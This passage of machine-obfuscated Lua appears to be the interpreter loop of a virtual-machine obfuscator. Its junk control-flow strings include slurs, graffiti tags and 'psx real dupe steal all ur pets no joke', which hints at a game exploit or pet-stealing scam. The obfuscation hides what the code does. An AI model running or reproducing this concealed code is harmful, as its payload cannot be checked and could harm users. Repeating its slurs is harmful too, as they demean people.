a;l[e[w]]=e[h];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[r]][e[k]]=l[e[D]];o=o+d;e=n[o];l[e[O]]=f[e[t]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[r]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[b]][e[c]]=e[P];o=o+d;e=n[o];l[e[w]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]][e[h]]=l[e[M]];o=o+d;e=n[o];l[e[b]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[r]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[r]][e[U]]=e[_];o=o+d;e=n[o];l[e[r]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[r]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[w]]=f[e[U]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[B]];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[b]][e[k]]=l[e[_]];o=o+d;e=n[o];l[e[x]][e[k]]=e[P];o=o+d;e=n[o];l[e[b]][e[c]]=l[e[B]];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[D]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[c]]=e[M];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[i]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[w]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[w]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[w]]=l[e[U]][e[B]];o=o+d;e=n[o];l[e[i]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[b]][e[c]]=e[N];o=o+d;e=n[o];l[e[b]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[N]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[r]]=e[U];break end;break;end while 3899==(a)/((-#[[Gay porn]]+(0x8beed/141)))do a=(75190)while(0xc8-(0x1b0-272))<C do a-= a l[e[x]][l[e[U]]]=l[e[B]];break end while(a)/((0x60c-818))==103 do y[e[U]]=l[e[x]];break end;break;end break;end while(a)/((587964/0x9c))==3324 do a=(294574)while(0x96-107)>=C do a-= a a=(5509152)while(0x8b-97)<C do a-= a local a;a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[r]][e[k]]=l[e[M]];o=o+d;e=n[o];l[e[x]]=f[e[U]];o=o+d;e=n[o];l[e[r]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]][e[c]]=l[e[P]];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[_]];o=o+d;e=n[o];l[e[r]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[i]][e[U]]=l[e[B]];o=o+d;e=n[o];l[e[w]][e[c]]=e[M];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[w]][e[h]]=e[N];o=o+d;e=n[o];l[e[O]][e[c]]=e[P];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[b]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[O]]=e[k];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[w]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[r]][e[U]]=e[M];o=o+d;e=n[o];l[e[w]][e[t]]=l[e[N]];o=o+d;e=n[o];l[e[i]]=f[e[U]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]][e[c]]=l[e[B]];o=o+d;e=n[o];l[e[x]][e[t]]=e[N];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[D]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];a=e[w]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[O]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[B]];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[r]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[b]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[i]]=e[c];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[h]]=l[e[D]];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[D]];o=o+d;e=n[o];l[e[r]][e[h]]=l[e[P]];o=o+d;e=n[o];l[e[b]][e[h]]=e[D];o=o+d;e=n[o];l[e[r]]=f[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[N]];o=o+d;e=n[o];l[e[x]]=e[h];break end while(a)/((0x5ce60/184))==2664 do local r;local a;l[e[b]]=f[e[t]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[O]]=y[e[k]];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];l[e[x]]=l[e[h]][e[B]];o=o+d;e=n[o];l[e[w]]=l[e[t]][e[P]];o=o+d;e=n[o];a=e[w];r=l[e[u]];l[a+1]=r;l[a]=r[e[_]];break end;break;end while 2779==(a)/((0xb7+-77))do a=(2219189)while(-0x1e+74)>=C do a-= a l[e[x]]=(e[h]~=0);o=o+S;break;end while(a)/(((713+-0x21)+-127))==4013 do a=(3324850)while(-#[[cilerteddoesntlikeburgers]]+(-0x39+127))<C do a-= a if not l[e[O]]then o=o+S;else o=e[k];end;break end while(a)/((307262/0x86))==1450 do local e=e[r]l[e]=l[e](s(l,e+d,g))break end;break;end break;end break;end break;end while 1861==(a)/(((6116/0x16)+-#'Negro'))do a=(10955700)while C<=(10200/0xc8)do a-= a a=(2954610)while(5712/0x77)>=C do a-= a a=(1511430)while C>(0x7e-79)do a-= a local a;l[e[b]][e[t]]=e[B];o=o+d;e=n[o];l[e[b]]=f[e[h]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[i]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[b]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[b]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[i]][e[c]]=e[N];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[b]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[b]][e[U]]=l[e[P]];o=o+d;e=n[o];l[e[w]][e[h]]=e[B];o=o+d;e=n[o];l[e[b]][e[t]]=e[_];o=o+d;e=n[o];l[e[r]][e[k]]=e[N];o=o+d;e=n[o];l[e[x]][e[k]]=l[e[_]];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[r]][e[u]]=l[e[D]];o=o+d;e=n[o];l[e[r]][e[k]]=e[M];o=o+d;e=n[o];l[e[r]]=f[e[t]];o=o+d;e=n[o];l[e[r]]=l[e[u]][e[P]];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[w]]=e[t];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[b]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[b]][e[U]]=e[D];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[b]]=l[e[u]][e[D]];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[i]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[P]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[w]]=e[c];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[r]]=e[k];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[r]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[x]][e[h]]=e[B];o=o+d;e=n[o];l[e[x]][e[c]]=l[e[D]];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[B]];o=o+d;e=n[o];l[e[i]]=e[h];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[U]]=l[e[M]];o=o+d;e=n[o];l[e[r]][e[h]]=e[_];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[r]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[O]]=e[t];break end while 2490==(a)/(((0xad6-1433)-734))do local r;local a;l[e[x]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[U]][e[N]];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[w]]=y[e[k]];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[b]]=l[e[c]][e[M]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[N]];o=o+d;e=n[o];a=e[O];r=l[e[h]];l[a+1]=r;l[a]=r[e[P]];break end;break;end while 2790==(a)/((0x8b6-1171))do a=(1525608)while(0x2df/15)>=C do a-= a local o=e[r]local n,e=m(l[o](s(l,o+1,e[h])))g=e+o-1 local e=0;for o=o,g do e=e+d;l[o]=n[e];end;break;end while 2018==(a)/((-#[[deadphonelua]]+(1645-0x36d)))do a=(2997936)while C>(171-0x79)do a-= a local a;a=e[b]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[i]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[i]][e[U]]=l[e[_]];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[_]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[i]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[w]]=f[e[k]];o=o+d;e=n[o];l[e[b]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[O]]=l[e[c]][e[D]];o=o+d;e=n[o];l[e[O]][e[k]]=l[e[B]];o=o+d;e=n[o];l[e[w]][e[k]]=e[_];o=o+d;e=n[o];l[e[x]]=f[e[u]];o=o+d;e=n[o];l[e[i]]=l[e[c]][e[N]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[w]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[B]];o=o+d;e=n[o];l[e[w]][e[U]]=e[M];o=o+d;e=n[o];l[e[b]][e[u]]=e[D];o=o+d;e=n[o];l[e[x]]=f[e[t]];o=o+d;e=n[o];l[e[i]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[w]][e[h]]=l[e[_]];o=o+d;e=n[o];l[e[i]][e[h]]=l[e[_]];o=o+d;e=n[o];l[e[r]][e[c]]=e[N];o=o+d;e=n[o];l[e[i]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];l[e[x]]=e[U];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[w]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[w]][e[h]]=e[N];o=o+d;e=n[o];l[e[r]]=f[e[h]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[M]];o=o+d;e=n[o];l[e[x]]=e[t];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[O]][e[c]]=l[e[_]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[P]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[b]]=e[h];o=o+d;e=n[o];l[e[i]]=e[t];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[c]))o=o+d;e=n[o];l[e[i]][e[t]]=l[e[P]];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[r]]=e[t];o=o+d;e=n[o];l[e[b]]=e[t];o=o+d;e=n[o];l[e[O]]=e[t];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[x]][e[t]]=l[e[D]];o=o+d;e=n[o];l[e[i]][e[c]]=e[B];o=o+d;e=n[o];l[e[b]]=f[e[U]];o=o+d;e=n[o];l[e[w]]=l[e[u]][e[_]];o=o+d;e=n[o];l[e[b]]=l[e[t]][e[M]];o=o+d;e=n[o];l[e[O]][e[U]]=l[e[N]];o=o+d;e=n[o];l[e[x]][e[U]]=e[M];o=o+d;e=n[o];l[e[w]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[t]][e[P]];break end while(a)/((5324-0xa94))==1146 do local a;l[e[r]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[O]]=e[u];o=o+d;e=n[o];l[e[O]]=e[c];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[O]][e[h]]=l[e[B]];o=o+d;e=n[o];l[e[O]]=f[e[h]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[P]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[r]]=e[u];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[U]))o=o+d;e=n[o];l[e[O]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[O]]=l[e[h]][e[N]];o=o+d;e=n[o];l[e[O]]=l[e[k]][e[P]];o=o+d;e=n[o];l[e[b]][e[t]]=l[e[M]];o=o+d;e=n[o];l[e[b]][e[t]]=e[D];o=o+d;e=n[o];l[e[b]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[k]][e[M]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[x]]=e[k];o=o+d;e=n[o];l[e[x]]=e[u];o=o+d;e=n[o];a=e[r]l[a]=l[a](s(l,a+d,e[t]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[N]];o=o+d;e=n[o];l[e[b]][e[t]]=e[N];o=o+d;e=n[o];l[e[i]][e[h]]=e[P];o=o+d;e=n[o];l[e[b]][e[u]]=e[N];o=o+d;e=n[o];l[e[r]][e[t]]=e[P];o=o+d;e=n[o];l[e[x]][e[c]]=l[e[N]];o=o+d;e=n[o];l[e[i]]=f[e[u]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[N]];o=o+d;e=n[o];l[e[b]]=e[u];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[i]][e[h]]=l[e[P]];o=o+d;e=n[o];l[e[i]][e[u]]=e[B];o=o+d;e=n[o];l[e[O]]=f[e[u]];o=o+d;e=n[o];l[e[b]]=l[e[c]][e[B]];o=o+d;e=n[o];l[e[r]]=e[U];o=o+d;e=n[o];l[e[b]]=e[k];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[h]))o=o+d;e=n[o];l[e[i]][e[u]]=l[e[M]];o=o+d;e=n[o];l[e[i]]=f[e[c]];o=o+d;e=n[o];l[e[x]]=l[e[U]][e[D]];o=o+d;e=n[o];l[e[O]]=e[h];o=o+d;e=n[o];l[e[i]]=e[U];o=o+d;e=n[o];l[e[i]]=e[k];o=o+d;e=n[o];l[e[r]]=e[h];o=o+d;e=n[o];a=e[O]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];l[e[b]][e[k]]=l[e[P]];o=o+d;e=n[o];l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[i]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[w]]=l[e[c]][e[P]];o=o+d;e=n[o];l[e[b]][e[t]]=l[e[P]];o=o+d;e=n[o];l[e[x]][e[c]]=e[D];o=o+d;e=n[o];l[e[r]]=f[e[k]];o=o+d;e=n[o];l[e[x]]=l[e[t]][e[_]];o=o+d;e=n[o];l[e[x]]=e[c];o=o+d;e=n[o];l[e[r]]=e[c];o=o+d;e=n[o];l[e[x]]=e[h];o=o+d;e=n[o];a=e[x]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[x]][e[k]]=l[e[N]];o=o+d;e=n[o];l[e[O]][e[U]]=e[N];o=o+d;e=n[o];l[e[r]][e[t]]=e[M];o=o+d;e=n[o];l[e[O]][e[c]]=e[M];o=o+d;e=n[o];l[e[O]][e[h]]=e[N];o=o+d;e=n[o];l[e[i]][e[t]]=l[e[_]];o=o+d;e=n[o];l[e[O]]=f[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[k]][e[_]];o=o+d;e=n[o];l[e[b]]=e[c];o=o+d;e=n[o];l[e[w]]=e[k];o=o+d;e=n[o];l[e[w]]=e[U];o=o+d;e=n[o];a=e[b]l[a]=l[a](s(l,a+d,e[k]))o=o+d;e=n[o];l[e[w]][e[u]]=l[e[M]];break end;break;end break;end break;end while 2775==(a)/((398748/0x65))do a=(6002034)while C<=(7897/0x95)do a-= a a=(38430)while(200-0x94)<C do a-= a local a;l[e[i]]=f[e[h]];o=o+d;e=n[o];l[e[i]]=l[e[h]][e[_]];o=o+d;e=n[o];l[e[r]]=l[e[k]];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]();break end while 61==(a)/((1371-0x2e5))do local g;local _;local C;local a;l[e[w]]=f[e[c]];o=o+d;e=n[o];l[e[r]]=l[e[U]][e[D]];o=o+d;e=n[o];a=e[w];C=l[e[t]];l[a+1]=C;l[a]=C[e[N]];o=o+d;e=n[o];l[e[r]]=l[e[k]];o=o+d;e=n[o];l[e[r]]=l[e[c]];o=o+d;e=n[o];a=e[i]l[a]=l[a](s(l,a+d,e[u]))o=o+d;e=n[o];a=e[b];C=l[e[h]];l[a+1]=C;l[a]=C[e[B]];o=o+d;e=n[o];a=e[O]l[a]=l[a](l[a+S])o=o+d;e=n[o];_={l,e};_[S][_[p][i]]=_[d][_[p][P]]+_[S][_[p][u]];o=o+d;e=n[o];l[e[r]]=l[e[U]]%e[P];o=o+d;e=n[o];a=e[x]l[a]=l[a](l[a+S])o=o+d;e=n[o];C=e[h];g=l[C]for e=C+1,e[M]do g=g..l[e];end;l[e[b]]=g;o=o+d;e=n[o];_={l,e};_[S][_[p][r]]=_[d][_[p][D]]+_[S][_[p][t]];o=o+d;e=n[o];l[e[i]]=l[e[U]]%e[N];break end;break;end while 2139==(a)/(((0x4a910/108)+-#'windows xp startup sfx'))do a=(2219352)while C<=(195-0x8d)do a-= a local i;local r;local a;l[e[w]]=e[c];o=o+d;e=n[o];l[e[w]]=e[u];o=o+d;e=n[o];l[e[w]]=#l[e[u]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[b];r=l[a]i=l[a+2];if(i>0)then if(r>l[a+1])then o=e[t];else l[a+3]=r;end elseif(r<l[a+1])then o=e[u];else l[a+3]=r;end break;end while(a)/((696198/0xc5))==628 do a=(5194588)while(0x127a/86)<C do a-= a l[e[r]]=l[e[t]];break end while 1559==(a)/((((-0x67+3568)+-#'0nly segc')+-124))do l[e[r]]=l[e[u]][l[e[N]]];break end;break;end break;end break;end break;end break;end while 1115==(a)/(((3774-0x76a)+-#"impulse was here omg"))do a=(190706)while((-0x76+195)+-#"nicowashere")>=C do a-= a a=(766104)while(0x2eb4/((0xb040/192)+-#[[psx real dupe steal all ur pets no joke]]))>=C do a-= a a=(5733540)while C<=((188-0x7b)+-#[[mf stfu]])do a-= a a=(60720)while(127+-0x46)<C do a-= a local a;l[e[i]]=f[e[k]];o=o+d;e=n[o];l[e[O]]=e[U];o=o+d;e=n[o];a=e[i]l[a]=l[a](l[a+S])o=o+d;e=n[o];l[e[x]]();o=o+d;e=n[o];do return end;break end while(a)/((0xcd-117))==690 do local d=e[O];local o=l[e[c]];l[d+1]=o;l[d]=o[e[N]];break end;break;end while(a)/(((-0x3e+3251)+-#"Crackzzzz"))==1803 do a=(7527745)while((((27376/0x74)+-#'Nsrds GAYYYYAIAHAKAJAVAHAUA')-0x81)+-#"this is a meme string")>=C do a-= a local e=e[b]l[e](l[e+S])break;end while 4045==(a)/((-#"nicowashere"+(0xf0b-1979)))do a=(1923219)while((10664+-0x68)/0xb0)<C do a-= a local k;local 